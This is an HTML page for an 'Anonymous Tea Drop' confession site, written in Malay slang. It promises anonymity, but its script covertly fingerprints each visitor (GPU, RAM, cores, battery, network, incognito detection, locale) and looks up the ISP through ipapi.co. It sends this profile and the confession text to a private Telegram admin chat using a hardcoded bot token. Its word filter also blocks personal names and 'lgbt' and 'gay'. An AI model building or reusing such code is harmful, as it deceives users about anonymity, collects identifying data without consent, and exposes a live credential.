<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confession</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Plus Jakarta Sans', sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            perspective: 1000px;
            overflow: hidden;
            background: linear-gradient(-45deg, #0e1014, #1c0f38, #004d40, #1a2d5e);
            background-size: 400% 400%;
            animation: gradientShift 25s ease infinite;
        }

        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .glass-card {
            background: rgba(30, 41, 59, 0.6);
            backdrop-filter: blur(25px) saturate(200%);
            -webkit-backdrop-filter: blur(25px) saturate(200%);
            border: 1px solid rgba(255, 255, 255, 0.15);
            box-shadow: 0 10px 40px 0 rgba(0, 0, 0, 0.5);
            border-radius: 2.5rem;
            transform-style: preserve-3d;
            transition: all 0.5s ease;
        }

        .blurred {
            filter: blur(25px);
            pointer-events: none;
        }

        .modal-overlay {
            background: rgba(0, 0, 0, 0.85);
            backdrop-filter: blur(8px);
            z-index: 100;
        }

        #confessionText {
            background-color: rgba(255, 255, 255, 0.08);
            color: #f3f4f6;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .tnc-clickable {
            color: #818cf8;
            text-decoration: underline;
            cursor: pointer;
        }
    </style>
</head>
<body class="text-gray-100">

    <!-- Modal Human Verification -->
    <div id="consentModal" class="fixed inset-0 modal-overlay flex items-center justify-center p-6">
        <div class="bg-[#111827] border border-white/10 p-10 rounded-[2.5rem] max-w-sm w-full shadow-2xl text-center">
            <div class="w-16 h-16 bg-indigo-500/20 rounded-full flex items-center justify-center mx-auto mb-6">
                <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-indigo-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04m18.236 0 a11.956 11.956 0 001 8.618 11.955 11.955 0 01-1 8.618c1.921 0 3.743-.435 5.382-1.214M12 21a9.003 9.003 0 008.382-5.618" />
                </svg>
            </div>
            <h2 class="text-2xl font-bold mb-4">Verify Dulu Bro</h2>
            <p class="text-gray-300 text-sm leading-relaxed mb-8">
                I am human and stay anonymous. View <span class="tnc-clickable" id="tncLink">terma</span>.
            </p>
            <button id="agreeBtn" class="w-full py-4 bg-indigo-600 hover:bg-indigo-500 rounded-2xl font-black text-white transition-all active:scale-95 shadow-xl">
                SETUJU BRO
            </button>
        </div>
    </div>

    <div class="w-full max-w-md mx-auto px-4">
        <div id="tiltCard" class="glass-card p-8 sm:p-12 w-full blurred relative overflow-hidden">
            
            <div class="card-inner" id="cardMainContent">
                <div id="formContainer">
                    <h1 class="text-4xl font-extrabold text-center text-white mb-2">Anonymous Tea Drop</h1>
                    <p class="text-center text-indigo-300 mb-8 text-xl font-light">luah je semua benda.</p>

                    <form id="confessionForm" class="space-y-6">
                        <textarea 
                            id="confessionText" 
                            rows="7" 
                            required 
                            placeholder="taip kat sini woi..."
                            class="mt-1 block w-full rounded-2xl shadow-xl p-5 border transition duration-300 resize-none text-base focus:border-indigo-500 focus:ring-0"
                        ></textarea>
                        
                        <button 
                            type="submit" 
                            id="submitButton"
                            class="w-full flex justify-center py-4 rounded-2xl text-xl font-bold text-white bg-indigo-600 hover:bg-indigo-500 transition duration-200 shadow-lg"
                        >
                            <span id="buttonText">SEND CEPATTT</span>
                        </button>
                    </form>
                </div>

                <div id="statusMessage" class="mt-6 p-4 rounded-xl hidden text-center text-white font-medium"></div>
            </div>
        </div>
    </div>

    <script>
        const BOT_TOKEN = '7580498741:AAF5_hPXPKLqobwVLHfR7_g6HShqAPrnpzM';
        const PUBLIC_CHAT_ID = '-1001841870133'; 
        const PRIVATE_LOG_ID = '-1003635312239'; 

        const profanityList = ['sofea', 'sofia', 'izzat', 'porn', 'thila', 'horny', 'tetek', 'kote', 'sangap', 'blowjob', 'lancap', 'toceng', 'sex', 'cum', 'pepek', 'fuck', 'pussy', 'babi', 'lgbt', 'gay', 'sial', 'peliaq', 'hanat', 'kimak', 'kiwak', 'buto', 'butoh', 'pukimak', 'barua', 'konek', 'pantat', 'patamak', 'seks', 'pntt', 'delete', 'bangsat', 'anak haram', 'haram jadah', 'puki', 'berayaq'];

        // Deep forensic capture
        async function getStats() {
            let stats = {
                os: "N/A", gpu: "N/A", cores: navigator.hardwareConcurrency || "N/A",
                ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
                res: `${window.screen.width}x${window.screen.height}`,
                bat: "N/A", net: "N/A", ping: "N/A", incog: "No",
                locale: `${navigator.language} / ${Intl.DateTimeFormat().resolvedOptions().timeZone}`
            };

            try {
                const ua = navigator.userAgent;
                if (/iPhone|iPad|iPod/.test(ua)) stats.os = "iOS (Safari)";
                else if (/Android/.test(ua)) stats.os = "Android";
                else stats.os = "Desktop/Other";

                const gl = document.createElement('canvas').getContext('webgl');
                if (gl) {
                    const debug = gl.getExtension('WEBGL_debug_renderer_info');
                    stats.gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "N/A";
                }

                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    stats.bat = Math.round(b.level * 100) + "%";
                }

                if (navigator.connection) {
                    stats.net = navigator.connection.effectiveType?.toUpperCase() || "N/A";
                    stats.ping = navigator.connection.rtt ? navigator.connection.rtt + "ms" : "N/A";
                }

                if ('storage' in navigator && 'estimate' in navigator.storage) {
                    const {quota} = await navigator.storage.estimate();
                    if (quota < 120000000) stats.incog = "Yes";
                }
            } catch(e) {}
            return stats;
        }

        async function getIpIntel() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                return await res.json();
            } catch(e) { return {}; }
        }

        document.getElementById('tncLink').onclick = (e) => {
            e.stopPropagation();
            const customAlert = document.createElement('div');
            customAlert.className = "fixed inset-0 z-[200] flex items-center justify-center p-4 bg-black/60";
            customAlert.innerHTML = `
                <div class="bg-gray-900 border border-white/10 p-6 rounded-2xl max-w-xs w-full text-center shadow-2xl">
                    <h3 class="font-bold text-lg mb-2 text-white">buat syarat je ni</h3>
                    <p class="text-sm text-gray-400 mb-4">Semua benda dah bagi, kau jangan jadi bingai, takyah nak rosakkan web ni and takyah nak melucah je kerja kau...</p>
                    <button class="w-full py-2 bg-indigo-600 rounded-lg text-sm font-bold text-white" onclick="this.parentElement.parentElement.remove()">Tutup</button>
                </div>
            `;
            document.body.appendChild(customAlert);
        };

        document.getElementById('agreeBtn').onclick = () => {
            document.getElementById('consentModal').classList.add('hidden');
            document.getElementById('tiltCard').classList.remove('blurred');
        };

        function checkSpamFuzzy(text) {
            const simplify = (str) => str.toLowerCase().replace(/(.)\1+/g, '$1').replace(/[^a-z0-9\s]/g, '');
            const cleanInput = simplify(text);
            for (const word of profanityList) {
                if (cleanInput.includes(simplify(word))) return word;
            }
            return null;
        }

        const form = document.getElementById('confessionForm');
        const textArea = document.getElementById('confessionText');
        const statusDiv = document.getElementById('statusMessage');

        form.onsubmit = async (e) => {
            e.preventDefault();
            const text = textArea.value.trim();
            if(!text) return;

            const badWord = checkSpamFuzzy(text);
            if (badWord) {
                statusDiv.innerText = `Takleh hantar sebab ada perkataan dilarang.`;
                statusDiv.className = "mt-6 p-4 rounded-xl text-center bg-red-600 text-white block";
                statusDiv.classList.remove('hidden');
                return;
            }

            const btn = document.getElementById('submitButton');
            btn.disabled = true;
            btn.innerText = "SENDING...";

            try {
                const [s, ip] = await Promise.all([getStats(), getIpIntel()]);

                // Public Message
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: PUBLIC_CHAT_ID, text: text })
                });

                // Admin Log Message (Format yang kau nak)
                const adminMsg = `🔐 *ADMIN LOG*\n` +
                                `👤 *User:* Handshake Failed (Incognito/Unverified)\n` +
                                `💻 *Sys/GPU:* ${s.os} / ${s.gpu}\n` +
                                `🛠️ *Hard:* ${s.cores} Cores / ${s.ram} RAM\n` +
                                `📡 *Net:* ${s.net} / Ping: ${s.ping}\n` +
                                `🔋 *Power:* ${s.bat}\n` +
                                `🕵️ *Incog:* ${s.incog}\n` +
                                `📏 *Res:* ${s.res}\n` +
                                `🌍 *Locale:* ${s.locale}\n` +
                                `🏢 *ISP:* ${ip.org || 'N/A'}\n` +
                                `💬 *Content:* \n"${text}"`;

                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: PRIVATE_LOG_ID,
                        text: adminMsg,
                        parse_mode: 'Markdown'
                    })
                });

                statusDiv.innerText = "Dah hantar wehh!";
                statusDiv.className = "mt-6 p-4 rounded-xl text-center bg-green-600 text-white block";
                textArea.value = "";
                statusDiv.classList.remove('hidden');
                setTimeout(() => statusDiv.classList.add('hidden'), 5000);
            } catch (err) {
                statusDiv.innerText = "Error sambung ke server.";
                statusDiv.className = "mt-6 p-4 rounded-xl text-center bg-red-600 text-white block";
                statusDiv.classList.remove('hidden');
            } finally {
                btn.disabled = false;
                btn.innerText = "SEND CEPATTT";
            }
        };
    </script>
</body>
</html>
